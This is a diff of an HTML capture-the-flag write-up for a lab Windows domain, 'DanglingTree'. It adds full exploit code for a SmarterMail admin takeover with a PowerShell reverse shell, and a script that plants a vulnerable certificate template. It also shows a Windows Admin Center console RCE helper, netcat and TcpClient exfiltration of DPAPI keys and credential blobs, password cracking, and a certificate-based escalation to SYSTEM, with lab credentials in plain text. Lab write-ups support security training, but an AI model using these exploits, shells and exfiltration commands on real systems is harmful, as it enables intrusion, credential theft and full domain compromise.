@@ -72,14 +72,17 @@ smbclient //danglingtree.htb/IT -N
 
 pdftotext DanglingTree_RoE_Assessment.pdf DanglingTree_RoE_Assessment.txt
 # anderson.w:R3dT3am@Acc3ss#01</code></pre>
-
+          <p>Let's verify the credential</p>
           <pre><code>nxc smb <span class="ph">&lt;target-ip&gt;</span> -d danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01'
-nxc smb <span class="ph">&lt;target-ip&gt;</span> -d danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01' --shares
+# SMB         10.129.10.238   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+# SMB         10.129.10.238   445    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01</code></pre>
+          <p>Nice, the credential is valid. Let enumeration more <code>users</code> and <code>shares</code> with that credential.</p>
+          <pre><code>nxc smb <span class="ph">&lt;target-ip&gt;</span> -d danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01' --shares
 nxc smb <span class="ph">&lt;target-ip&gt;</span> -d danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01' --users --rid-brute 3000</code></pre>
 
           <h2>2. Exploitation</h2>
           <h3>Windows Admin Center (port 6600)</h3>
-          <p>Log in at <code>https://danglingtree.htb:6600/</code> with <code>anderson.w</code> / <code>R3dT3am@Acc3ss#01</code>.</p>
+          <p>Log in at <code>https://danglingtree.htb:6600/</code> with <code>anderson.w</code>:<code>R3dT3am@Acc3ss#01</code>.</p>
 
           <div class="note-image">
             <img src="../src/images/danglingtree/danglingtree-1.png" alt="Windows Admin Center sign-in" onclick="toggleZoom(this)">
@@ -91,23 +94,41 @@ nxc smb <span class="ph">&lt;target-ip&gt;</span> -d danglingtree.htb -u anderso
             <img src="../src/images/danglingtree/danglingtree-2.png" alt="WAC connection error — blocked by RBAC" onclick="toggleZoom(this)">
           </div>
 
-          <p>WAC reports version <strong>2511</strong> / build <strong>2.6.4.11</strong>:</p>
+          <p>WAC reports version <strong>2511</strong> | build <strong>2.6.4.11</strong>:</p>
 
           <div class="note-image">
             <img src="../src/images/danglingtree/danglingtree-3.png" alt="WAC version 2511 build 2.6.4.11" onclick="toggleZoom(this)">
           </div>
-
-          <p>From the browser console, the SME PowerShell endpoint still accepts commands via <code>invokeWac</code> — UI RBAC is bypassed. <code>whoami; hostname</code> returns <code>danglingtree\anderson.w</code> / <code>dc</code>:</p>
-
-          <div class="note-image">
-            <img src="../src/images/danglingtree/danglingtree-4.png" alt="Browser console RCE as anderson.w" onclick="toggleZoom(this)">
+          <div class="callout warning">
+            <strong>⚠️ CVE-2026-26119</strong>
+            Improper authentication in Windows Admin Center allows an authorized attacker to elevate privileges over a network.
+          </div>
+          <div class="callout warning">
+            <strong>⚠️ Root Cause</strong>
+            Windows Admin Center incorrectly trusts the gateway's machine account when processing PowerShell execution requests through the WinREST API. While a legitimate session runs commands as the authenticated user, the vulnerable authentication chain causes WAC to instead trust and execute commands with the gateway computer account's privileges, leading to privilege escalation.
           </div>
 
-                    <p>Module in use: <code>msft.sme.shell</code> <strong>6.8.9</strong>.</p>
+          <p><strong>Attack Vector</strong></p>
+          <p>The vulnerability exists in the PowerShell execution endpoint</p>
+          <pre><code>/api/services/WinREST/PowerShell/nodes/&lt;node&gt;/invokeCommand</code></pre>
 
+          <p><strong>Exploitation Requirements</strong></p>
+          <ul>
+            <li>Valid authenticated WAC session (cookie)</li>
+            <li>Matching XSRF-TOKEN for CSRF protection</li>
+            <li>Module name and version (discoverable via JavaScript)</li>
+            <li>Network access to the WAC gateway</li>
+          </ul>
+          <h3>Module Enumeration</h3>
+          <p>The required component values are exposed directly through the client-side JavaScript runtime</p>
+          <pre><code>({
+    name: MsftSme.self().Environment.name,
+    version: MsftSme.self().Environment.version
+});</code></pre>
           <div class="note-image">
-            <img src="../src/images/danglingtree/danglingtree-5.png" alt="msft.sme.shell version 6.8.9" onclick="toggleZoom(this)">
+            <img src="../src/images/danglingtree/danglingtree-4.png" alt="msft.sme.shell version 6.8.9" onclick="toggleZoom(this)">
           </div>
+          <p>Module in use: <code>msft.sme.shell</code> <strong>6.8.9</strong>.</p>
 
           <h3>Confirm RCE — <code>invokeWac</code> helper</h3>
           <pre><code>// First define the helper function
@@ -146,6 +167,12 @@ async function invokeWac(script) {
 // Test
 const poc = await invokeWac("whoami; hostname");
 console.log(poc);</code></pre>
+
+          <p>From the browser console, the SME PowerShell endpoint still accepts commands via <code>invokeWac</code> — UI RBAC is bypassed. <code>whoami; hostname</code> returns <code>danglingtree\anderson.w</code> / <code>dc</code>:</p>
+
+          <div class="note-image">
+            <img src="../src/images/danglingtree/danglingtree-5.png" alt="Browser console RCE as anderson.w" onclick="toggleZoom(this)">
+          </div>
 
           <h3>Reverse Shell as <code>anderson.w</code></h3>
           <pre><code># attacker
@@ -207,7 +234,111 @@ C:\Windows\Temp\chisel.exe client <span class="ph">&lt;attacker-ip&gt;</span>:80
             <strong>⚠️ CVE-2026-23760</strong>
             SmarterMail &lt; 9511: anonymous force password reset for sysadmin + RCE via Volume Mounts. RID-brute suggested <code>svc_mail</code> as the mail admin.
           </div>
+          <p>We assigned a known password to <code>svc_mail</code> via the anonymous force-reset-password endpoint with <code>RCE</code> via Volume Mounts</p>
+          <p>Craft the python script</p>
+          <pre><code>#!/usr/bin/env python3
+"""
+CVE-2026-23760 - SmarterMail < 9511 admin password reset + RCE via Volume Mounts
+"""
+import argparse
+import json
+import time
+import urllib.request
 
+def post(base, path, data, token=None, timeout=15):
+    req = urllib.request.Request(base + path, data=json.dumps(data).encode(), headers={
+        "Content-Type": "application/json",
+    }, method="POST")
+    if token:
+        req.add_header("Authorization", "Bearer " + token)
+    with urllib.request.urlopen(req, timeout=timeout) as r:
+        return r.read().decode()
+
+def reset_admin_password(base, username, new_password):
+    body = {
+        "IsSysAdmin": "true",
+        "OldPassword": "whatever",
+        "Username": username,
+        "NewPassword": new_password,
+        "ConfirmPassword": new_password,
+    }
+    resp = json.loads(post(base, "/api/v1/auth/force-reset-password", body))
+    if not resp.get("success"):
+        raise RuntimeError(f"Password reset failed: {resp.get('message')} / {resp.get('debugInfo')}")
+    print(f"[+] Password for '{username}' reset to '{new_password}'")
+    return resp
+
+def authenticate(base, username, new_password):
+    auth = json.loads(post(base, "/api/v1/auth/authenticate-user", {
+        "username": username, "password": new_password, "language": "en",
+    }))
+    if not auth.get("success"):
+        raise RuntimeError("Authentication failed: " + str(auth))
+    print(f"[+] Authenticated as '{auth.get('username')}' (admin={auth.get('isAdmin')})")
+    return auth["accessToken"]
+
+def create_mount(base, token, mount_path, command, timeout=12):
+    payload = {
+        "mountPath": mount_path,
+        "commandMount": command,
+        "commandUnmount": "",
+        "useArgumentsInCommand": False,
+        "enabled": True,
+    }
+    try:
+        resp = post(base, "/api/v1/settings/sysadmin/AddOrUpdateMount", payload, token, timeout=timeout)
+        print(f"[+] AddOrUpdateMount: {resp}")
+        return resp
+    except (TimeoutError, urllib.error.URLError):
+        print("[!] Request timed out (server is waiting on the command). Expected for a "
+              "persistent reverse shell - check your listener.")
+        return None
+
+def main():
+    ap = argparse.ArgumentParser(description="CVE-2026-23760 SmarterMail admin takeover + RCE")
+    ap.add_argument("target", help="e.g. http://127.0.0.1:17017")
+    ap.add_argument("--username", default="svc_mail", help="sysadmin username (default: svc_mail)")
+    ap.add_argument("--password", default="NewPassword123!@#", help="new admin password")
+    ap.add_argument("--lhost", default="<attacker-ip>", help="reverse shell listener IP") # change ip here
+    ap.add_argument("--lport", default="4445", help="reverse shell listener port")
+    ap.add_argument("--command", default=None, help="custom command (overrides reverse shell)")
+    ap.add_argument("--no-reset", action="store_true", help="skip password reset if already done")
+    args = ap.parse_args()
+
+    base = args.target.rstrip("/")
+
+    if not args.no_reset:
+        reset_admin_password(base, args.username, args.password)
+
+    token = authenticate(base, args.username, args.password)
+
+    if args.command:
+        cmd = args.command
+    else:
+        ps = ("$client=New-Object System.Net.Sockets.TCPClient('%s',%s);"
+              "$stream=$client.GetStream();"
+              "[byte[]]$bytes=0..65535|%%{0};"
+              "while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;"
+              "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
+              "$sendback=(iex $data 2>&1|Out-String);"
+              "$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
+              "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
+              "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
+              "$client.Close()") % (args.lhost, args.lport)
+        # Start-Process detaches the shell so the API call returns immediately
+        enc = "powershell -nop -w hidden -c \"" + ps.replace(chr(34), chr(92) + chr(34)) + "\""
+        cmd = "cmd.exe /c start /b " + enc
+
+    # Mount path doubles as the unique key - use a fresh one each run to avoid clashes
+    mount_path = "C:\\Windows\\Temp\\mailmount" + str(int(time.time()))
+    print(f"[*] Creating volume mount {mount_path}")
+    print(f"[*] Command: {cmd[:100]}...")
+    print(f"[*] Start your listener:  nc -lvnp {args.lport}")
+    create_mount(base, token, mount_path, cmd)
+
+if __name__ == "__main__":
+    main()</code></pre>
+    <p>Run the exploit</p>
           <pre><code># attacker — start listener first
 nc -lnvp 4445
 
@@ -232,6 +363,7 @@ dir C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b
           <pre><code>"password_encrypted":"66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby"</code></pre>
 
           <p>Exfil the crypto assembly for offline analysis:</p>
+          <p>Send file from target to attacker machine</p>
           <pre><code># attacker
 nc -lnvp 60001 > SmarterMail.Standard.dll
 
@@ -245,6 +377,7 @@ $stream.Close()
 $client.Close()</code></pre>
 
           <p>In <strong>dnSpy</strong>, search <code>CryptographyHelper</code>. Crack DES offline:</p>
+          <p>These two password pairs using <code>PyCryptodome</code></p>
           <pre><code>from base64 import b64decode
 from Crypto.Cipher import DES
 from Crypto.Util.Padding import unpad
@@ -266,10 +399,14 @@ for name, (key, iv) in keymaps.items():
         print(f"{name}: {plaintext.decode()}")
     except (ValueError, UnicodeDecodeError):
         pass
-# keymap2: RiverDragon#Storm25</code></pre>
+</code></pre>
+
+<pre><code>python3 crack.py
+# keymap2: RiverDragon#Storm25
+</code></pre>
 
           <h3>RunasCs → <code>noah.b</code></h3>
-          <p>No WinRM — escalate from <code>svc_mail</code> with RunasCs:</p>
+          <p>Since the target does not have a WinRM port open (e.g., 5985), we used Noah's credentials to run <code>RunasCs</code> from the <code>svc_mail</code> shell.</p>
           <pre><code># attacker
 nc -lnvp 6666
 python3 -m http.server 8000
@@ -280,9 +417,11 @@ C:\Windows\Temp\RunasCs.exe noah.b 'RiverDragon#Storm25' cmd.exe -r <span class=
 # whoami → danglingtree\noah.b</code></pre>
 
 <h3>BloodHound Collection</h3>
-          <pre><code>sudo ntpdate -u danglingtree.htb
+<p>To prevent any error, we have synced time to target</p>
+          <pre><code>sudo ntpdate -u danglingtree.htb</code></pre>
 
-rusthound-ce \
+<p>We would prefer use <code>rusthound-ce</code> to help us collect the data</p>
+<pre><code>rusthound-ce \
   -d danglingtree.htb \
   -u 'noah.b@danglingtree.htb' \
   -p 'RiverDragon#Storm25' \
@@ -298,30 +437,35 @@ rusthound-ce \
           </div>
 
           <h3>DPAPI → <code>alex.o</code></h3>
+          <p>Shell as <code>noah.b</code></p>
+          <p>Microsoft's <code>cmdkey</code>utility will list the currently stored credentials</p>
           <pre><code>cmdkey /list
 # Target: Domain:target=PC01.danglingtree.htb
 # Type: Domain Password
-# User: alex.o
-
+# User: alex.o</code></pre>
+<p><code>alex.o</code>seems interesting here. Even though he didn't reveal the password, we were still able to find Noah's credentials and master key file.</p>
+<pre><code>powershell
 Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force
 Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Recurse -Force</code></pre>
 
-          <p>Exfil master key + credential blob to the attacker:</p>
+          <p>We found something interesting. We still need to download them to our local machine for cracking.
+            Exfil master key + credential blob to the attacker:</p>
           <pre><code># attacker
 nc -lvnp 6001 > f53fcaba-f057-48e8-8f92-0180d274bf0f
 nc -lvnp 6002 > 57FFB67D684C67F09E7153B9C7CC3940
 
 # target
 powershell -NoProfile -Command "$p='C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f';$b=[IO.File]::ReadAllBytes($p);$c=[Net.Sockets.TcpClient]::new('<span class="ph">&lt;attacker-ip&gt;</span>',6001);$s=$c.GetStream();$s.Write($b,0,$b.Length);$s.Close();$c.Close()"
-
 powershell -NoProfile -Command "$p='C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\57FFB67D684C67F09E7153B9C7CC3940';$b=[IO.File]::ReadAllBytes($p);$c=[Net.Sockets.TcpClient]::new('<span class="ph">&lt;attacker-ip&gt;</span>',6002);$s=$c.GetStream();$s.Write($b,0,$b.Length);$s.Close();$c.Close()"</code></pre>
 
+<p>We used the domain password from Impacket's <code>dpapi.py</code> to decrypt the master key:</p>
           <pre><code>impacket-dpapi masterkey \
   -file f53fcaba-f057-48e8-8f92-0180d274bf0f \
   -sid 'S-1-5-21-4220238332-57023728-1129110646-1602' \
-  -password 'RiverDragon#Storm25'
+  -password 'RiverDragon#Storm25'</code></pre>
 
-impacket-dpapi credential \
+<p>Provide the key to the credential parser</p>
+<pre><code>impacket-dpapi credential \
   -file 57FFB67D684C67F09E7153B9C7CC3940 \
   -key 0x7120d9adb3b8ccd8901bf9e2a29afabcbbcbdb5a13a24a1817bda49097c7ff3c8e5d71f34ae43850a136dc64dbd37061d4f9c34bdbdca21aa8af57d26baad0d8
 # alex.o:SunsetMountainPeak@2025</code></pre>
@@ -331,6 +475,7 @@ impacket-dpapi credential \
             <strong>💡 BloodHound</strong>
             <code>alex.o</code> (Support-IT) can force-change password on <code>jake.h</code>.
           </div>
+          <p>Now we can try to change the password of<code>Jake.H</code></p>
           <pre><code>bloodyAD -H dc.danglingtree.htb -i <span class="ph">&lt;target-ip&gt;</span> \
   -d danglingtree.htb \
   -u alex.o -p 'SunsetMountainPeak@2025' \
@@ -344,12 +489,13 @@ impacket-dpapi credential \
 
           <h2>3. Privilege Escalation</h2>
           <h3>AD CS — Missing Published Templates</h3>
+          <p><code>Certipy</code>'s initial scan extracted CA-level permissions provided by Helpdesk_Cert_Support:</p>
           <pre><code>certipy find \
   -u 'jake.h@danglingtree.htb' -p 'Admin@123' \
   -dc-ip <span class="ph">&lt;target-ip&gt;</span> -dc-host dc.danglingtree.htb \
-  -stdout | grep -i ManageCertificates
-
-bloodyAD -H dc.danglingtree.htb -i <span class="ph">&lt;target-ip&gt;</span> \
+  -stdout | grep -i ManageCertificates</code></pre>
+<p>The group name alone does not prove the delegated permissions. We need to use bloodyAD to query Jake's valid child object permissions</p>
+<pre><code>bloodyAD -H dc.danglingtree.htb -i <span class="ph">&lt;target-ip&gt;</span> \
   -d danglingtree.htb -u jake.h -p 'Admin@123' \
   -s get writable --partition CONFIGURATION --right CHILD --detail
 # CREATE_CHILD on CN=Certificate Templates and CN=OID</code></pre>
@@ -359,9 +505,10 @@ bloodyAD -H dc.danglingtree.htb -i <span class="ph">&lt;target-ip&gt;</span> \
   -D 'jake.h@danglingtree.htb' -w 'Admin@123' \
   -b 'CN=danglingtree-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
   -s base '(objectClass=pKIEnrollmentService)' certificateTemplates
-# includes EmployeeAuthTemplate, RemoteAccessVPN, VPNUserTemplate, ...
+# includes EmployeeAuthTemplate, RemoteAccessVPN, VPNUserTemplate, ...</code></pre>
 
-for template in RemoteAccessVPN EmployeeAuthTemplate VPNUserTemplate; do
+<p>Continued checking each corresponding object under <code>CN=Certificate Templates</code></p>
+<pre><code>for template in RemoteAccessVPN EmployeeAuthTemplate VPNUserTemplate; do
   LDAPTLS_REQCERT=never ldapsearch -LLL -x -H ldaps://<span class="ph">&lt;target-ip&gt;</span> \
     -D 'jake.h@danglingtree.htb' -w 'Admin@123' \
     -b "CN=$template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb" \
@@ -371,20 +518,174 @@ done
 
           <h3>Create <code>EmployeeAuthTemplate</code> + ESC1 Config</h3>
           <p>Use a helper script to create the OID + <code>pKICertificateTemplate</code> object, grant Authenticated Users control, then apply Certipy’s ESC1 defaults:</p>
+          <p>Let's create a missing<code>EmployeeAuthTemplate</code>.</p>
+          <pre><code>#!/usr/bin/env python3
+
+import argparse
+import secrets
+import ssl
+import struct
+
+from impacket.ldap import ldaptypes
+from ldap3 import ALL, BASE, MODIFY_REPLACE, SUBTREE, Connection, Server, SIMPLE, Tls
+from ldap3.protocol.microsoft import security_descriptor_control
+
+CLIENT_AUTH = "1.3.6.1.5.5.7.3.2"
+
+def fail(connection, action):
+    raise SystemExit(f"[-] {action}: {connection.result}")
+
+def create_ace(sid, mask):
+    ace = ldaptypes.ACE()
+    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+    ace["AceFlags"] = 0
+    ace["Ace"] = ldaptypes.ACCESS_ALLOWED_ACE()
+    ace["Ace"]["Mask"] = ldaptypes.ACCESS_MASK()
+    ace["Ace"]["Mask"]["Mask"] = mask
+    ace["Ace"]["Sid"] = ldaptypes.LDAP_SID()
+    ace["Ace"]["Sid"].fromCanonical(sid)
+    return ace
+
+def create_security_descriptor(sid):
+    descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR()
+    descriptor["Revision"] = b"\x01"
+    descriptor["Sbz1"] = b"\x00"
+    descriptor["Control"] = 0x9C04
+    descriptor["OwnerSid"] = ldaptypes.LDAP_SID()
+    descriptor["OwnerSid"].fromCanonical(sid)
+    descriptor["GroupSid"] = b""
+    descriptor["Sacl"] = b""
+
+    descriptor["Dacl"] = ldaptypes.ACL()
+    descriptor["Dacl"]["AclRevision"] = 2
+    descriptor["Dacl"]["Sbz1"] = 0
+    descriptor["Dacl"]["Sbz2"] = 0
+    descriptor["Dacl"].aces = [
+        create_ace(sid, 983551),
+        create_ace("S-1-5-11", 131220),
+    ]
+    return descriptor
+
+parser = argparse.ArgumentParser(
+    description="Create a certificate-template OID and an initial template object over LDAPS"
+)
+parser.add_argument("-H", "--host", required=True)
+parser.add_argument("-u", "--user", required=True)
+parser.add_argument("-p", "--password", required=True)
+parser.add_argument("-t", "--template", default="EmployeeAuthTemplate")
+args = parser.parse_args()
+
+tls = Tls(validate=ssl.CERT_NONE)
+server = Server(args.host, port=636, use_ssl=True, tls=tls, get_info=ALL)
+connection = Connection(
+    server,
+    user=args.user,
+    password=args.password,
+    authentication=SIMPLE,
+    auto_bind=True,
+    check_names=False,
+)
+
+config_dn = server.info.other["configurationNamingContext"][0]
+oid_base = f"CN=OID,CN=Public Key Services,CN=Services,{config_dn}"
+template_base = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{config_dn}"
+template_dn = f"CN={args.template},{template_base}"
+
+connection.search(template_dn, "(objectClass=*)", BASE, attributes=["cn"])
+template_exists = bool(connection.entries)
+
+if not template_exists:
+    connection.search(oid_base, "(objectClass=*)", BASE, attributes=["msPKI-Cert-Template-OID"])
+    root_oid = connection.entries[0]["msPKI-Cert-Template-OID"].value
+
+    connection.search(
+        oid_base,
+        "(objectClass=msPKI-Enterprise-Oid)",
+        SUBTREE,
+        attributes=["msPKI-Cert-Template-OID"],
+    )
+    prefix = f"{root_oid}.1."
+    indexes = []
+    for entry in connection.entries:
+        value = entry["msPKI-Cert-Template-OID"].value
+        if value and value.startswith(prefix) and value[len(prefix) :].isdigit():
+            indexes.append(int(value[len(prefix) :]))
+
+    index = max(indexes, default=0) + 1
+    template_oid = f"{prefix}{index}"
+    oid_cn = f"{index}.{secrets.token_hex(16).upper()}"
+    oid_dn = f"CN={oid_cn},{oid_base}"
+
+    oid_attributes = {
+        "objectClass": ["top", "msPKI-Enterprise-Oid"],
+        "cn": oid_cn,
+        "displayName": args.template,
+        "flags": 1,
+        "msPKI-Cert-Template-OID": template_oid,
+    }
+
+    if not connection.add(oid_dn, attributes=oid_attributes):
+        fail(connection, "OID creation failed")
+
+    template_attributes = {
+        "objectClass": ["top", "pKICertificateTemplate"],
+        "cn": args.template,
+        "displayName": args.template,
+        "instanceType": 4,
+        "showInAdvancedViewOnly": True,
+        "flags": 0,
+        "revision": 1,
+        "pKIDefaultKeySpec": 2,
+        "pKIKeyUsage": b"\x86\x00",
+        "pKIMaxIssuingDepth": -1,
+        "pKICriticalExtensions": ["2.5.29.19", "2.5.29.15"],
+        "pKIExpirationPeriod": struct.pack("&lt;q", -315360000000000),
+        "pKIOverlapPeriod": struct.pack("&lt;q", -36288000000000),
+        "pKIExtendedKeyUsage": [CLIENT_AUTH],
+        "pKIDefaultCSPs": [
+            "2,Microsoft Base Cryptographic Provider v1.0",
+            "1,Microsoft Enhanced Cryptographic Provider v1.0",
+        ],
+        "msPKI-RA-Signature": 0,
+        "msPKI-Enrollment-Flag": 0,
+        "msPKI-Private-Key-Flag": 16,
+        "msPKI-Certificate-Name-Flag": 1,
+        "msPKI-Minimal-Key-Size": 2048,
+        "msPKI-Template-Schema-Version": 1,
+        "msPKI-Template-Minor-Revision": 1,
+        "msPKI-Cert-Template-OID": template_oid,
+    }
+
+    if not connection.add(template_dn, attributes=template_attributes):
+        connection.delete(oid_dn)
+        fail(connection, "template creation failed")
+
+    print(f"[+] OID:      {template_oid}")
+    print(f"[+] OID DN:   {oid_dn}")
+
+descriptor = create_security_descriptor("S-1-5-11").getData()
+changes = {"nTSecurityDescriptor": [(MODIFY_REPLACE, [descriptor])]}
+control = security_descriptor_control(sdflags=0x04)
+if not connection.modify(template_dn, changes, controls=control):
+    fail(connection, "DACL update failed")
+
+print(f"[+] Template: {template_dn}")
+print("[+] Authenticated Users received full control")</code></pre>
+
           <pre><code>python3 create_template.py \
   -H dc.danglingtree.htb \
   -u 'jake.h@danglingtree.htb' \
   -p 'Admin@123' \
-  -t EmployeeAuthTemplate
+  -t EmployeeAuthTemplate</code></pre>
 
-certipy template \
+<pre><code>certipy template \
   -u 'jake.h@danglingtree.htb' -p 'Admin@123' \
   -dc-ip <span class="ph">&lt;target-ip&gt;</span> -dc-host dc.danglingtree.htb \
   -template EmployeeAuthTemplate \
   -write-default-configuration S-1-5-11 \
-  -no-save -force
+  -no-save -force</code></pre>
 
-certipy find \
+<pre><code>certipy find \
   -u 'jake.h@danglingtree.htb' -p 'Admin@123' \
   -dc-ip <span class="ph">&lt;target-ip&gt;</span> -dc-host dc.danglingtree.htb \
   -vulnerable
@@ -392,18 +693,15 @@ certipy find \
 # ESC15 — schema v1
 # ESC4 — template owned by user</code></pre>
 
-          <div class="callout info">
-            <strong>💡 Note</strong>
-            Full <code>create_template.py</code> (ldap3 + SR_SECURITY_DESCRIPTOR) is in the lab notes / original writeup source — creates OID under <code>CN=OID</code>, template under <code>CN=Certificate Templates</code>, then sets DACL.
-          </div>
-
           <h3>Request Admin Cert → SYSTEM</h3>
+          <p>ESC1 allows Jake to request a client authentication certificate for another principal. We first query the domain SID and append the administrator RID 500</p>
           <pre><code>rpcclient -U 'DANGLINGTREE/jake.h%Admin@123' dc.danglingtree.htb -c 'lsaquery'
-# domain SID → append RID 500 for Administrator
+# domain SID → append RID 500 for Administrator</code></pre>
 
-sudo ntpdate -u danglingtree.htb
-
-certipy req \
+<p>To prevent any errors, we start time sync</p>
+<pre><code>sudo ntpdate -u danglingtree.htb</code></pre>
+<p>Continue requesting a certificate containing the administrator <code>UPN</code> and object SID.</p>
+<pre><code>certipy req \
   -u 'jake.h@danglingtree.htb' -p 'Admin@123' \
   -dc-ip <span class="ph">&lt;target-ip&gt;</span> -dc-host dc.danglingtree.htb \
   -ca danglingtree-DC-CA \
@@ -411,15 +709,17 @@ certipy req \
   -upn 'administrator@danglingtree.htb' \
   -sid 'S-1-5-21-4220238332-57023728-1129110646-500' \
   -dynamic-endpoint \
-  -out administrator.pfx
+  -out administrator.pfx</code></pre>
 
-certipy auth \
+<p>Finally, verify the certificate.</p>
+<pre><code>certipy auth \
   -pfx administrator.pfx \
   -dc-ip <span class="ph">&lt;target-ip&gt;</span> \
   -domain danglingtree.htb \
-  -username administrator
+  -username administrator</code></pre>
 
-impacket-psexec \
+  <p>We get <code>administrator</code> hash and were able to obtain a shell using Impacket's <code>psexec.py</code>.</p>
+<pre><code>impacket-psexec \
   'danglingtree.htb/Administrator@dc.danglingtree.htb' \
   -hashes ':<span class="ph">&lt;NT-HASH&gt;</span>'
 # whoami → nt authority\system</code></pre>
